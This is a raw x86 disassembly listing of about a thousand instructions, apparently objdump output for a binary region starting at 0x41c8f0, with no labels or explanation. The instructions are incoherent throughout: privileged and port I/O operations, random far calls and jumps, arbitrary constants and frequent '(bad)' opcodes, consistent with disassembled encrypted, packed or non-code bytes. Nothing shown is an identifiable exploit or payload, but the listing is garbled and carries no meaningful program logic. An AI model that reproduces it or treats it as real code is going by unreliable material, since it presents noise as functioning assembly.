  41c8f0:	dec    ebx
  41c8f1:	dec    eax
  41c8f2:	cli    
  41c8f3:	ins    DWORD PTR es:[edi],dx
  41c8f4:	sub    BYTE PTR [ebp+ecx*4+0x5],al
  41c8f8:	inc    esp
  41c8f9:	jno    0x41c96a
  41c8fb:	push   es
  41c8fc:	jne    0x41c92b
  41c8fe:	push   esi
  41c8ff:	shl    eax,0x91
  41c902:	xor    eax,0xb51c5c13
  41c907:	call   0x5fe1e424
  41c90c:	and    dl,BYTE PTR [esi]
  41c90e:	inc    esp
  41c90f:	push   edx
  41c910:	sbb    al,0xdc
  41c912:	stos   BYTE PTR es:[edi],al
  41c913:	daa    
  41c914:	mov    ss,WORD PTR [ecx]
  41c916:	test   DWORD PTR [ebx],eax
  41c918:	sbb    ecx,DWORD PTR [ebp+edi*8+0x73912ec6]
  41c91f:	les    ebp,FWORD PTR [ebp+0x4]
  41c922:	ret    
  41c923:	vpsubusw xmm4,xmm7,XMMWORD PTR [ebp+0x5b0697ac]
  41c92b:	pop    bp
  41c92d:	xor    eax,0x44af5c31
  41c932:	lds    ecx,FWORD PTR [ecx+ecx*2-0x30ed9921]
  41c939:	enter  0xf809,0xff
  41c93d:	pop    ebx
  41c93e:	ret    
  41c93f:	popa   
  41c940:	retf   
  41c941:	mov    ebx,0xf91ab8d
  41c946:	dec    ecx
  41c947:	pop    eax
  41c948:	add    DWORD PTR ds:0x138d4d87,edx
  41c94e:	push   edx
  41c94f:	xchg   esi,eax
  41c950:	es add eax,0x52083e43
  41c956:	jnp    0x41c9b2
  41c958:	out    0x9c,eax
  41c95a:	mov    ch,0x1d
  41c95c:	mov    ah,0xfc
  41c95e:	mov    ebx,0xa80998a3
  41c963:	in     al,dx
  41c964:	lds    ebx,FWORD PTR [esi]
  41c966:	stos   DWORD PTR es:[edi],eax
  41c967:	retf   
  41c968:	nop
  41c969:	hlt    
  41c96a:	call   0xd34f6332
  41c96f:	adc    dh,BYTE PTR ds:0xafa8c25c
  41c975:	cmc    
  41c976:	fimul  DWORD PTR [edi+ebp*2-0x334eaa1d]
  41c97d:	jno    0x41c9f6
  41c97f:	add    cl,dh
  41c981:	cdq    
  41c982:	fiadd  DWORD PTR [eax-0x54f661b7]
  41c988:	xor    BYTE PTR [ebx+0x61],dl
  41c98b:	mov    ds:0x631d6fbd,eax
  41c990:	jge    0x41c9db
  41c992:	clc    
  41c993:	ins    DWORD PTR es:[edi],dx
  41c994:	add    al,0xbc
  41c996:	iret   
  41c997:	mov    bl,0x4c
  41c999:	in     eax,dx
  41c99a:	sahf   
  41c99b:	lds    esp,FWORD PTR [edx+0x41af4b19]
  41c9a1:	and    DWORD PTR [edi+edx*8],esi
  41c9a4:	fcmovbe st,st(6)
  41c9a6:	or     al,0x3d
  41c9a8:	popa   
  41c9a9:	and    eax,0xaffe0904
  41c9ae:	sbb    BYTE PTR [ebp+0x4234c892],ch
  41c9b4:	test   DWORD PTR [ebx],eax
  41c9b6:	rcl    DWORD PTR [ebp+0x14b5ef23],1
  41c9bc:	not    dh
  41c9be:	jecxz  0x41ca2a
  41c9c0:	es loopne 0x41c991
  41c9c3:	mov    BYTE PTR [edx+0x7fb8bca5],dh
  41c9c9:	imul   edx,DWORD PTR [edx+edx*1+0x44],0xb3e655eb
  41c9d1:	imul   eax,DWORD PTR [ecx-0x3],0x1e95db89
  41c9d8:	push   eax
  41c9d9:	test   eax,ebp
  41c9db:	cwde   
  41c9dc:	push   DWORD PTR [esp+ebx*8+0x2352119e]
  41c9e3:	xor    eax,DWORD PTR [eax+edi*1+0x6fe627bb]
  41c9ea:	ds loop 0x41c985
  41c9ed:	lods   eax,DWORD PTR ds:[esi]
  41c9ee:	pop    ebp
  41c9ef:	pop    ds
  41c9f0:	dec    edi
  41c9f1:	mov    DWORD PTR [edi+ebx*4],ebx
  41c9f4:	sbb    eax,edi
  41c9f6:	sbb    ah,BYTE PTR [esi+0x5226b180]
  41c9fc:	pop    ds
  41c9fd:	inc    ebx
  41c9fe:	or     DWORD PTR [esi-0x32],esi
  41ca01:	test   BYTE PTR [ecx-0x17d5e043],ch
  41ca07:	xchg   ebp,eax
  41ca08:	or     BYTE PTR [edx],dl
  41ca0a:	adc    DWORD PTR [edx],esi
  41ca0c:	and    eax,0x5f9e477c
  41ca11:	popa   
  41ca12:	adc    BYTE PTR [esi+0x5dc5d39d],bh
  41ca18:	lock popf 
  41ca1a:	rcr    DWORD PTR [esi+0x6cd1d3ce],1
  41ca20:	jb     0x41ca52
  41ca22:	cwde   
  41ca23:	pushf  
  41ca24:	or     esp,DWORD PTR [ecx-0x18f969ef]
  41ca2a:	retf   0xd3ce
  41ca2d:	cmp    al,0x43
  41ca2f:	ret    
  41ca30:	ret    0x5579
  41ca33:	nop
  41ca34:	and    al,0x41
  41ca36:	jge    0x41ca7e
  41ca38:	mov    ds:0xebcb9fd6,eax
  41ca3d:	retf   
  41ca3e:	frstor ds:0x9279bcd9
  41ca44:	int    0xf1
  41ca46:	cmp    DWORD PTR [edx+0x7f],0xbdb94fa1
  41ca4d:	push   es
  41ca4e:	and    edi,ebp
  41ca50:	gs inc edx
  41ca52:	mov    edi,0xba965a55
  41ca57:	pop    edx
  41ca58:	and    al,0x5a
  41ca5a:	adc    al,0xee
  41ca5c:	push   edx
  41ca5d:	pushf  
  41ca5e:	cmp    al,0xc8
  41ca60:	ret    
  41ca61:	fcmovnu st,st(5)
  41ca63:	jmp    DWORD PTR [esi*1+0x64107eca]
  41ca6a:	ja     0x41ca39
  41ca6c:	ins    BYTE PTR es:[edi],dx
  41ca6d:	add    bh,al
  41ca6f:	pushf  
  41ca70:	aaa    
  41ca71:	ss dec ecx
  41ca73:	fwait
  41ca74:	jl     0x41caab
  41ca76:	ret    0x8487
  41ca79:	ins    DWORD PTR es:[edi],dx
  41ca7a:	lods   eax,DWORD PTR es:[esi]
  41ca7c:	mov    ebx,0x7439d235
  41ca81:	in     eax,0xf4
  41ca83:	cmp    BYTE PTR [ebp-0x30],bl
  41ca86:	ret    
  41ca87:	int3   
  41ca88:	loopne 0x41ca28
  41ca8a:	xchg   bl,al
  41ca8c:	aam    0xb0
  41ca8e:	leave  
  41ca8f:	sub    eax,0x81667edc
  41ca94:	aaa    
  41ca95:	sbb    eax,0x4c7e4d84
  41ca9a:	mul    DWORD PTR [eax+0x231bd087]
  41caa0:	daa    
  41caa1:	aad    0x88
  41caa3:	int    0x79
  41caa5:	jae    0x41ca43
  41caa7:	ja     0x41ca9d
  41caa9:	stc    
  41caaa:	popf   
  41caab:	dec    eax
  41caac:	jno    0x41cb10
  41caae:	dec    edx
  41caaf:	push   edi
  41cab0:	adc    edi,DWORD PTR [eax+eiz*8+0x23]
  41cab4:	pop    edi
  41cab5:	loope  0x41ca78
  41cab7:	fisub  WORD PTR [esi+0x3e8b07b4]
  41cabd:	jae    0x41ca98
  41cabf:	ret    0x7445
  41cac2:	stos   DWORD PTR es:[edi],eax
  41cac3:	inc    ecx
  41cac4:	cdq    
  41cac5:	sti    
  41cac6:	mov    ebx,0x2c038ec3
  41cacb:	gs shl ebx,cl
  41cace:	mov    dl,0xea
  41cad0:	and    esi,DWORD PTR [ecx+0x2ebd67bb]
  41cad6:	outs   dx,BYTE PTR ds:[esi]
  41cad7:	pop    es
  41cad8:	sti    
  41cad9:	call   0x493327b9
  41cade:	test   eax,esp
  41cae0:	mov    ebp,0x3f08402d
  41cae5:	push   0x8cfd0330
  41caea:	pop    esi
  41caeb:	(bad)  
  41caec:	call   0xeedecd1b
  41caf1:	imul   esp,DWORD PTR [eax],0xffffffdd
  41caf4:	pushf  
  41caf5:	sbb    bl,BYTE PTR [ebx]
  41caf7:	dec    edi
  41caf8:	cli    
  41caf9:	mov    eax,gs
  41cafb:	xchg   ebx,eax
  41cafc:	imul   ebp,DWORD PTR [ecx+0x6dff9c40],0xffffffac
  41cb03:	imul   ebx,DWORD PTR [esi-0xb229324],0x2d4b0ecc
  41cb0d:	mov    ah,0x8
  41cb0f:	pop    edx
  41cb10:	inc    eax
  41cb11:	mov    dl,0x53
  41cb13:	mov    dl,0x54
  41cb15:	dec    ebx
  41cb16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb17:	clc    
  41cb18:	dec    esi
  41cb19:	(bad)  
  41cb1a:	cmp    ah,BYTE PTR [edx+0x4c]
  41cb1d:	lds    ebp,FWORD PTR [edx]
  41cb1f:	xchg   edi,eax
  41cb20:	pop    edi
  41cb21:	inc    ebp
  41cb22:	aaa    
  41cb23:	(bad)  
  41cb24:	fild   QWORD PTR [eax]
  41cb26:	inc    bh
  41cb28:	pop    edi
  41cb29:	cmp    al,0x5c
  41cb2b:	das    
  41cb2c:	test   DWORD PTR [ecx-0x25],eax
  41cb2f:	push   cs
  41cb30:	ret    
  41cb31:	xchg   edx,eax
  41cb32:	adc    esi,eax
  41cb34:	mov    ds:0x7d0b245,eax
  41cb39:	dec    esp
  41cb3a:	cld    
  41cb3b:	aad    0x8c
  41cb3d:	adc    edx,0x45934e42
  41cb43:	(bad)  
  41cb44:	mov    edx,0x7f2a05
  41cb49:	jne    0x41cb46
  41cb4b:	jle    0x41cb0d
  41cb4d:	add    esi,DWORD PTR [edi-0x4b2075d2]
  41cb53:	inc    ebx
  41cb54:	outs   dx,BYTE PTR ds:[esi]
  41cb55:	ins    DWORD PTR es:[edi],dx
  41cb56:	sub    eax,0x5eb312ba
  41cb5b:	loopne 0x41cb63
  41cb5d:	mov    esp,cr3
  41cb60:	xchg   esp,eax
  41cb61:	cdq    
  41cb62:	sbb    DWORD PTR [ebx-0x5f4d4cbd],edi
  41cb68:	adc    BYTE PTR ds:0x53febc3b,bl
  41cb6e:	sbb    eax,DWORD PTR [si]
  41cb71:	jo     0x41caf8
  41cb73:	push   ds
  41cb74:	retf   
  41cb75:	aas    
  41cb76:	cmp    al,0xfc
  41cb78:	sbb    bl,BYTE PTR [edx+0x63]
  41cb7b:	mov    esi,0x6cf4c4b4
  41cb80:	call   0x33466e9e
  41cb85:	mov    ebx,0x9a56bc94
  41cb8a:	inc    ebx
  41cb8b:	mov    cl,0x46
  41cb8d:	or     BYTE PTR [eax],dl
  41cb8f:	ja     0x41cbfb
  41cb91:	hlt    
  41cb92:	add    edi,DWORD PTR ds:0xc64613dd
  41cb98:	cs aas 
  41cb9a:	pop    ds
  41cb9b:	mov    edi,DWORD PTR [eax-0x38]
  41cb9e:	(bad)  
  41cb9f:	push   0x959b35b2
  41cba4:	iret   
  41cba5:	mov    esp,0xa794d0fb
  41cbaa:	add    BYTE PTR [ecx],cl
  41cbac:	push   ds
  41cbad:	mov    DWORD PTR [edi-0x27],esp
  41cbb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cbb1:	adc    bl,BYTE PTR [edi]
  41cbb3:	cwde   
  41cbb4:	xchg   edi,eax
  41cbb5:	mov    ch,0x44
  41cbb8:	push   ebp
  41cbb9:	inc    esi
  41cbba:	fcmovnb st,st(0)
  41cbbc:	out    0xc3,eax
  41cbbe:	xchg   ebp,eax
  41cbbf:	inc    ebx
  41cbc0:	push   edx
  41cbc1:	push   es
  41cbc2:	sub    DWORD PTR [esi-0xb],0xa35be438
  41cbc9:	aas    
  41cbca:	pop    edx
  41cbcb:	and    eax,DWORD PTR [edi-0x3]
  41cbce:	mov    bh,0xfc
  41cbd0:	jno    0x41cc44
  41cbd2:	dec    esp
  41cbd3:	inc    edi
  41cbd4:	mov    al,ds:0x3cd90fbe
  41cbd9:	loope  0x41cc29
  41cbdb:	orps   xmm6,XMMWORD PTR [ebp+0x5e]
  41cbdf:	and    eax,0xddfc5efe
  41cbe4:	ss pop eax
  41cbe6:	cmp    ecx,DWORD PTR [esi+0x55f73ae9]
  41cbec:	retf   0x5bdc
  41cbef:	fist   DWORD PTR [edx+edx*2-0x1c88cd1a]
  41cbf6:	ret    
  41cbf7:	sbb    bh,BYTE PTR [edi+0x55e7f3e0]
  41cbfd:	(bad)  
  41cbfe:	(bad)  
  41cbff:	div    DWORD PTR [edx]
  41cc01:	pop    esi
  41cc02:	inc    ebx
  41cc03:	sahf   
  41cc04:	jmp    0x41cc80
  41cc06:	or     eax,0x4a59d4aa
  41cc0b:	push   ds
  41cc0c:	fsub   QWORD PTR [edx]
  41cc0e:	xor    esp,DWORD PTR [esi+0x68]
  41cc11:	mov    dh,0x39
  41cc13:	mov    edi,ds
  41cc15:	sub    al,0x22
  41cc17:	mov    bh,0xd9
  41cc19:	sahf   
  41cc1a:	cli    
  41cc1b:	jle    0x41cc11
  41cc1d:	fiadd  DWORD PTR [ebp+0x58]
  41cc20:	lock fcomip st,st(3)
  41cc23:	add    dh,BYTE PTR [ebp+ebx*2-0x2]
  41cc27:	dec    ebp
  41cc28:	mov    esi,0xbe2cbf85
  41cc2d:	aas    
  41cc2e:	inc    esp
  41cc2f:	arpl   bp,dx
  41cc31:	xlat   BYTE PTR ds:[ebx]
  41cc32:	fldenv [edx-0x7f]
  41cc35:	imul   esp,esp,0x71
  41cc38:	jecxz  0x41cc55
  41cc3a:	pop    ebp
  41cc3b:	inc    edx
  41cc3c:	pop    eax
  41cc3d:	lods   eax,DWORD PTR ds:[esi]
  41cc3e:	sar    DWORD PTR [eax],0xf0
  41cc41:	jle    0x41cbcc
  41cc43:	push   ebx
  41cc44:	outs   dx,BYTE PTR ds:[esi]
  41cc45:	int    0xe8
  41cc47:	xchg   BYTE PTR [edx+0x7b4102f1],ah
  41cc4d:	pushf  
  41cc4e:	imul   esi,DWORD PTR [ecx],0x4f
  41cc51:	dec    edx
  41cc52:	mov    ecx,?
  41cc54:	or     ebx,esi
  41cc56:	add    eax,0x4bf9ea26
  41cc5b:	dec    edi
  41cc5c:	cld    
  41cc5d:	xor    BYTE PTR [ebp-0x1d],bl
  41cc60:	mov    edx,0x9dd37ab1
  41cc65:	lock jbe 0x41cbea
  41cc68:	retf   0x2644
  41cc6b:	mov    ecx,0xdd54c51c
  41cc70:	aad    0x42
  41cc72:	fwait
  41cc73:	xchg   ebx,eax
  41cc74:	test   DWORD PTR [esp+eiz*2+0x3112b2c4],ebp
  41cc7b:	cmc    
  41cc7c:	fnstenv [edi+0x2]
  41cc7f:	push   ss
  41cc80:	fnsave [esi+ebp*4-0x73]
  41cc84:	bound  esp,QWORD PTR [ebx+0x47]
  41cc87:	jge    0x41ccf0
  41cc89:	outs   dx,BYTE PTR ds:[esi]
  41cc8a:	mov    WORD PTR [eax-0x39],ds
  41cc8d:	scas   al,BYTE PTR es:[edi]
  41cc8e:	dec    ecx
  41cc8f:	std    
  41cc90:	and    BYTE PTR [ebx-0x30],al
  41cc93:	sub    eax,0xa7efa86c
  41cc98:	cs stc 
  41cc9a:	jbe    0x41cc37
  41cc9c:	popa   
  41cc9d:	push   ebp
  41cc9e:	and    ebx,edi
  41cca0:	mov    WORD PTR [ebx+0x34],?
  41cca3:	push   es
  41cca4:	xchg   ebx,eax
  41cca5:	add    ebx,DWORD PTR [edx-0x18]
  41cca8:	jnp    0x41ccd6
  41ccaa:	lods   eax,DWORD PTR ds:[esi]
  41ccab:	mov    al,0x20
  41ccad:	and    ch,BYTE PTR [esi]
  41ccaf:	mov    ds:0xb074237,al
  41ccb4:	mov    DWORD PTR [eax],esp
  41ccb6:	dec    esi
  41ccb7:	popf   
  41ccb8:	loop   0x41ccfa
  41ccba:	sub    ch,BYTE PTR [edx-0x51]
  41ccbd:	das    
  41ccbe:	adc    DWORD PTR [esi+0x8],eax
  41ccc1:	shl    DWORD PTR [ebx],1
  41ccc3:	ss xor eax,0x11692084
  41ccc9:	iret   
  41ccca:	dec    edi
  41cccb:	call   0x5c9:0x4fc824cf
  41ccd2:	in     eax,dx
  41ccd3:	or     eax,0xb1558435
  41ccd8:	push   ds
  41ccd9:	nop
  41ccda:	push   eax
  41ccdb:	gs dec esi
  41ccdd:	adc    eax,0x704468c
  41cce2:	outs   dx,BYTE PTR ds:[esi]
  41cce3:	aam    0x67
  41cce5:	iret   
  41cce6:	sar    BYTE PTR [ecx+0x60],1
  41cce9:	loope  0x41cc9e
  41cceb:	push   esi
  41ccec:	and    DWORD PTR [ecx-0x62d3c26a],eax
  41ccf2:	jnp    0x41cd21
  41ccf4:	cmp    BYTE PTR es:[eax+ebp*8+0x54f7069c],ch
  41ccfc:	adc    ch,0x9e
  41ccff:	adc    al,0x83
  41cd01:	xor    BYTE PTR [esp+esi*1],ah
  41cd04:	jl     0x41cce3
  41cd06:	cli    
  41cd07:	or     dl,cl
  41cd09:	lahf   
  41cd0a:	(bad)  
  41cd0b:	pop    esi
  41cd0c:	ret    0x6470
  41cd0f:	sbb    eax,0x902ef38f
  41cd14:	in     eax,dx
  41cd15:	pop    ds
  41cd16:	fadd   DWORD PTR [ecx]
  41cd18:	out    dx,al
  41cd19:	pop    edx
  41cd1a:	cs push es
  41cd1c:	mov    eax,ds:0xd3994297
  41cd21:	outs   dx,BYTE PTR ds:[esi]
  41cd22:	xchg   esi,eax
  41cd23:	xor    ah,BYTE PTR [edi-0x6f]
  41cd26:	sbb    ah,BYTE PTR [ecx+0x3a4fadd9]
  41cd2c:	sub    DWORD PTR [edx-0x11ec984a],esi
  41cd32:	lahf   
  41cd33:	mov    dl,0xf0
  41cd35:	rcl    BYTE PTR [edx+0x4],0xf8
  41cd39:	xchg   eax,edx
  41cd3b:	rcl    DWORD PTR [eax+edi*2],0xd0
  41cd3f:	xchg   edx,eax
  41cd40:	lea    ebp,[eax+0x3f]
  41cd43:	mov    al,0x11
  41cd45:	mov    eax,ds:0xd38e17f3
  41cd4a:	shl    BYTE PTR [eax+0x22],1
  41cd4d:	dec    ebp
  41cd4e:	cwde   
  41cd4f:	loopne 0x41cd82
  41cd51:	ins    BYTE PTR es:[edi],dx
  41cd52:	ja     0x41cd79
  41cd54:	cmp    ebp,edx
  41cd56:	and    al,0x8d
  41cd58:	sar    DWORD PTR ds:0xc61dcdf6,0xa
  41cd5f:	(bad)  
  41cd62:	cmc    
  41cd63:	fmul   DWORD PTR [eax+0x1f]
  41cd66:	or     BYTE PTR [edx],cl
  41cd68:	fldz   
  41cd6a:	shr    BYTE PTR [esi+0xa],1
  41cd6d:	or     esp,DWORD PTR [edi+0x963f42f]
  41cd73:	aam    0xf3
  41cd75:	ja     0x41cd9d
  41cd77:	mov    dl,0xdc
  41cd79:	push   0xffffffbb
  41cd7b:	sub    BYTE PTR [edx+0x1c],bh
  41cd7e:	pushf  
  41cd7f:	(bad)  [eax+0x4ab3efa]
  41cd85:	enter  0xb152,0x1a
  41cd89:	lock das 
  41cd8b:	add    DWORD PTR [ebx],0x7c2e7917
  41cd91:	and    eax,0xf1ce84f
  41cd96:	test   DWORD PTR [ebx],ebp
  41cd98:	outs   dx,DWORD PTR ds:[esi]
  41cd99:	imul   ecx,ecx,0x6e
  41cd9c:	out    dx,al
  41cd9d:	fs pop ebx
  41cd9f:	xchg   BYTE PTR [eax+0x68],ah
  41cda2:	mov    bh,0x2f
  41cda4:	fdiv   QWORD PTR [edi]
  41cda6:	sbb    eax,0x9911fc16
  41cdab:	push   esi
  41cdac:	pop    ecx
  41cdad:	pop    edi
  41cdae:	shr    DWORD PTR [ecx-0x7a7a3746],0xab
  41cdb5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cdb6:	ds in  eax,dx
  41cdb8:	sbb    al,0x26
  41cdba:	into   
  41cdbb:	ja     0x41cdf3
  41cdbd:	push   esi
  41cdbe:	test   DWORD PTR [edx+0x54],edi
  41cdc1:	inc    esi
  41cdc2:	pop    ss
  41cdc3:	in     eax,dx
  41cdc4:	outs   dx,BYTE PTR ds:[esi]
  41cdc5:	mov    ch,0x68
  41cdc7:	xchg   ebp,eax
  41cdc8:	cmp    eax,0xf6cf8045
  41cdcd:	xchg   BYTE PTR [esi+0x23],dh
  41cdd0:	ja     0x41cdc6
  41cdd2:	das    
  41cdd3:	mov    cl,0x7c
  41cdd5:	mov    dl,0xbd
  41cdd7:	in     eax,dx
  41cdd8:	popa   
  41cdd9:	inc    ebp
  41cdda:	push   ebp
  41cddb:	hlt    
  41cddc:	out    0xf7,eax
  41cdde:	mov    WORD PTR [eax],ds
  41cde0:	shl    dh,1
  41cde2:	cmc    
  41cde3:	out    0x9a,al
  41cde5:	fiadd  DWORD PTR [esi+0x5c]
  41cde8:	call   0xf65d:0x699bcb43
  41cdef:	mov    bh,0x80
  41cdf1:	(bad)  
  41cdf2:	fs bnd jae 0x41cdd5
  41cdf6:	in     al,dx
  41cdf7:	ins    DWORD PTR es:[edi],dx
  41cdf8:	inc    edi
  41cdf9:	pop    esi
  41cdfa:	jecxz  0x41cd9c
  41cdfc:	mov    eax,0x73655272
  41ce01:	pop    esi
  41ce02:	jg     0x41ce15
  41ce04:	rcr    ah,1
  41ce06:	mov    esp,0x566a950b
  41ce0b:	neg    dl
  41ce0d:	sahf   
  41ce0e:	std    
  41ce0f:	arpl   WORD PTR ds:0xabf7dcc1,sp
  41ce15:	and    cl,cl
  41ce17:	mov    dh,0x1e
  41ce19:	cmp    esp,ebx
  41ce1b:	push   ebp
  41ce1c:	push   ebp
  41ce1d:	faddp  st(5),st
  41ce1f:	mov    cl,0x22
  41ce21:	cld    
  41ce22:	inc    edi
  41ce23:	adc    dh,BYTE PTR [ecx+0x39c881b1]
  41ce29:	and    al,0x5c
  41ce2b:	cdq    
  41ce2c:	sbb    eax,0x1a122499
  41ce31:	add    BYTE PTR es:[esi],bl
  41ce34:	mov    ch,0x27
  41ce36:	and    eax,0x4efb5d8c
  41ce3b:	mov    eax,0xa93af26d
  41ce40:	mov    ds:0xc72d7c82,eax
  41ce45:	hlt    
  41ce46:	push   edi
  41ce47:	bound  edx,QWORD PTR [esi+esi*1+0x25]
  41ce4b:	js     0x41ceb9
  41ce4d:	add    dl,BYTE PTR [edi-0x6f]
  41ce50:	push   eax
  41ce51:	jmp    0x41cece
  41ce53:	and    ecx,DWORD PTR [esi+0x7c6ff124]
  41ce59:	cld    
  41ce5a:	ficom  WORD PTR [ebx+0x6]
  41ce5e:	or     eax,0x45750e4f
  41ce63:	jg     0x41cdee
  41ce65:	mov    dh,0x3e
  41ce67:	cmp    ebx,0xfffffffd
  41ce6a:	cmp    eax,0xc6c3293f
  41ce6f:	jns    0x41ce06
  41ce71:	xchg   ecx,eax
  41ce72:	mov    cl,0x4
  41ce74:	and    BYTE PTR [esi-0x5f],0x3a
  41ce78:	push   cs
  41ce79:	add    DWORD PTR [eax-0x4605196e],eax
  41ce7f:	mov    ch,0x8b
  41ce81:	and    al,0x18
  41ce83:	(bad)  
  41ce84:	test   dh,0xd5
  41ce87:	xchg   edi,eax
  41ce88:	(bad)  
  41ce89:	fstp   QWORD PTR [esi-0x1811823f]
  41ce8f:	pop    ecx
  41ce90:	pop    ds
  41ce91:	sbb    ecx,DWORD PTR [ebx+esi*4+0x1f28c37a]
  41ce98:	jae    0x41cee2
  41ce9a:	sbb    al,0x1b
  41ce9c:	scas   eax,DWORD PTR es:[edi]
  41ce9d:	xor    eax,0xae798eeb
  41cea2:	data16 mov ch,0x9c
  41cea5:	pop    esp
  41cea6:	mov    al,ds:0x3d33169f
  41ceab:	neg    BYTE PTR [edi-0x5b]
  41ceae:	sbb    DWORD PTR [eax+eax*2-0x5cf4e3f7],esp
  41ceb5:	stos   BYTE PTR es:[edi],al
  41ceb6:	mov    al,0x94
  41ceb8:	les    ebp,FWORD PTR [esi+0x62780bf]
  41cebe:	push   eax
  41cebf:	jo     0x41cf21
  41cec1:	(bad)  
  41cec2:	mov    ah,0x65
  41cec4:	scas   al,BYTE PTR es:[edi]
  41cec5:	fsub   DWORD PTR [eax+ecx*8+0x36]
  41cec9:	mov    eax,ds:0x9b88f423
  41cece:	add    dl,BYTE PTR [ecx-0x39c4509a]
  41ced4:	int    0x9
  41ced6:	add    eax,0x639b0dc6
  41cedb:	adc    BYTE PTR [esi+edi*1],ah
  41cede:	pushf  
  41cedf:	in     eax,0x15
  41cee1:	(bad)  
  41cee2:	sbb    BYTE PTR [eax-0x1d],bh
  41cee5:	adc    ch,ch
  41cee7:	loopne 0x41cf05
  41cee9:	mov    ah,0x9e
  41ceeb:	xchg   esp,eax
  41ceec:	push   cs
  41ceed:	test   al,0xc9
  41ceef:	test   BYTE PTR [edx],al
  41cef1:	lock xor BYTE PTR [edi-0x2c],0x99
  41cef6:	xor    eax,0x1377374b
  41cefb:	dec    edx
  41cefc:	(bad)  
  41cefd:	pop    eax
  41cefe:	sbb    al,0x2f
  41cf00:	jno    0x41cebe
  41cf02:	into   
  41cf03:	ret    
  41cf04:	mov    bh,0x90
  41cf06:	pop    ebp
  41cf07:	mov    esi,0x91f3ae5e
  41cf0c:	add    cl,BYTE PTR [edx]
  41cf0e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cf0f:	(bad)
  41cf12:	pop    DWORD PTR [edx+0x4bc72f45]
  41cf18:	cmc    
  41cf19:	(bad)  
  41cf1a:	fldcw  WORD PTR [edi-0x2bc5fb61]
  41cf20:	stos   DWORD PTR es:[edi],eax
  41cf21:	inc    ebx
  41cf22:	clc    
  41cf23:	mov    DWORD PTR [edi-0x3dcebd73],ebp
  41cf29:	jne    0x41cf6c
  41cf2b:	or     edi,esp
  41cf2d:	fiadd  DWORD PTR [ecx-0x6a]
  41cf30:	adc    bh,bl
  41cf32:	pusha  
  41cf33:	sub    al,0xde
  41cf35:	pop    ss
  41cf36:	fs inc eax
  41cf38:	(bad)  
  41cf39:	lock iret 
  41cf3b:	add    eax,0x47b330e7
  41cf40:	inc    edx
  41cf41:	shr    BYTE PTR [edi-0x5d],cl
  41cf44:	adc    ecx,eax
  41cf46:	ja     0x41cf70
  41cf48:	sbb    edx,esi
  41cf4a:	outs   dx,DWORD PTR ds:[esi]
  41cf4b:	cmp    eax,DWORD PTR [ecx]
  41cf4d:	jecxz  0x41cf4b
  41cf4f:	daa    
  41cf50:	push   ebx
  41cf51:	hlt    
  41cf52:	imul   edx,DWORD PTR [edx-0x6185ffc0],0xffffff83
  41cf59:	test   al,0x4f
  41cf5b:	ret    
  41cf5c:	js     0x41cfc3
  41cf5e:	jmp    0x41cf22
  41cf60:	mov    ds:0x2e9396d2,eax
  41cf65:	jge    0x41cfb0
  41cf67:	loope  0x41cf2b
  41cf69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cf6a:	xlat   BYTE PTR ds:[ebx]
  41cf6b:	adc    eax,DWORD PTR [edx+0x7f25b6e6]
  41cf71:	out    dx,al
  41cf72:	mov    ch,BYTE PTR [ecx+0x35]
  41cf75:	ret    0xf93
  41cf78:	pop    edx
  41cf79:	jl     0x41cf20
  41cf7b:	ss lahf 
  41cf7d:	ins    DWORD PTR es:[edi],dx
  41cf7e:	test   eax,0x772d3683
  41cf83:	cmp    dl,BYTE PTR [ebp-0x53]
  41cf86:	sbb    BYTE PTR [esi-0x4d2357d3],ah
  41cf8c:	dec    esi
  41cf8d:	mov    bl,0x45
  41cf8f:	inc    edx
  41cf90:	mov    BYTE PTR [ebx],dh
  41cf92:	mov    ds:0xbc39e9c8,eax
  41cf97:	js     0x41cfcf
  41cf99:	add    edi,ecx
  41cf9b:	dec    edi
  41cf9c:	mov    ebx,0xebb50727
  41cfa1:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cfa3:	ja     0x41cf7e
  41cfa5:	inc    esi
  41cfa6:	(bad)  
  41cfa7:	jge    0x41cf4c
  41cfa9:	ret    
  41cfaa:	out    0x55,eax
  41cfac:	mov    esp,0x39e7b8a9
  41cfb1:	loop   0x41cf4d
  41cfb3:	das    
  41cfb4:	mov    al,ds:0x53412c77
  41cfb9:	mov    ebx,0x300bcba9
  41cfbe:	sub    bh,BYTE PTR [ecx]
  41cfc0:	in     eax,dx
  41cfc1:	pop    ebp
  41cfc2:	dec    ecx
  41cfc3:	adc    eax,0xc5bd800d
  41cfc8:	mov    dh,0x44
  41cfca:	paddusw mm7,QWORD PTR [edx]
  41cfcd:	int    0x48
  41cfcf:	psubq  mm5,QWORD PTR [ebp-0x73]
  41cfd3:	push   edx
  41cfd4:	sbb    DWORD PTR [ecx],esi
  41cfd6:	mov    al,0xa4
  41cfd8:	cwde   
  41cfd9:	adc    eax,0x5e7d43b
  41cfde:	mov    ch,0xf3
  41cfe0:	and    BYTE PTR ds:0x45b538fd,bl
  41cfe6:	xchg   ecx,eax
  41cfe7:	nop
  41cfe8:	mov    esi,0x5525d774
  41cfed:	clc    
  41cfee:	and    bl,dl
  41cff0:	mov    esp,DWORD PTR [ebx-0x4954d25d]
  41cff6:	mov    dh,0x1
  41cff8:	pusha  
  41cff9:	test   eax,0x392e0eb2
  41cffe:	push   edx
  41cfff:	cmp    al,0xf
  41d001:	(bad)  
  41d002:	cmp    dh,BYTE PTR [ecx+0x56d6c834]
  41d008:	loop   0x41d038
  41d00a:	xchg   esp,eax
  41d00b:	xor    DWORD PTR [ecx+0x6e9a05eb],esi
  41d011:	fldcw  WORD PTR [edi+0x4d]
  41d014:	push   ds
  41d015:	test   DWORD PTR [edx-0x755a6a71],ecx
  41d01b:	mov    al,ds:0x69feae8d
  41d020:	fiadd  DWORD PTR [edx]
  41d022:	cmp    bl,BYTE PTR [edi]
  41d024:	xor    BYTE PTR [eax-0x17],bh
  41d027:	sub    DWORD PTR [ebx+0x1f],ebx
  41d02a:	sub    bh,BYTE PTR [ecx+0x6e]
  41d02d:	enter  0xf8bd,0xac
  41d031:	je     0x41d029
  41d033:	sub    edi,edx
  41d035:	les    esi,FWORD PTR [ecx+0x65c84467]
  41d03b:	xor    eax,DWORD PTR [eax+0x47cf7cfb]
  41d041:	test   bl,dh
  41d043:	xor    cl,bl
